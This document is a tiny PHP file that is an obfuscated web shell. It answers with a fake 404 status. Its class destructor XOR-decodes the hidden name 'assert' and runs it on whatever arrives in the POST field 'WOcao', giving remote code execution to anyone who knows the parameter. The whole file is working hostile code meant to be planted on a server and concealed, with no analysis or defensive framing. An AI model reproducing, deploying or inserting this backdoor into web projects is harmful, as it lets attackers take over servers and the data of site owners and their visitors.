<?php 
header('HTTP/1.1 404');
class QSJA { 
    public $c='';
    function __destruct() {
        $_0 = "\x46" ^ "\x27";
        $_1 = "\xd5" ^ "\xa6";
        $_2 = "\xf5" ^ "\x86";
        $_3 = "\x2a" ^ "\x4f";
        $_4 = "\xe7" ^ "\x95";
        $_5 = "\xb9" ^ "\xcd";
        $db =$_0.$_1.$_2.$_3.$_4.$_5;
        return @$db($this->c);
    }
}
$qsja = new QSJA();
@$qsja->c = $_POST['WOcao'];
?>
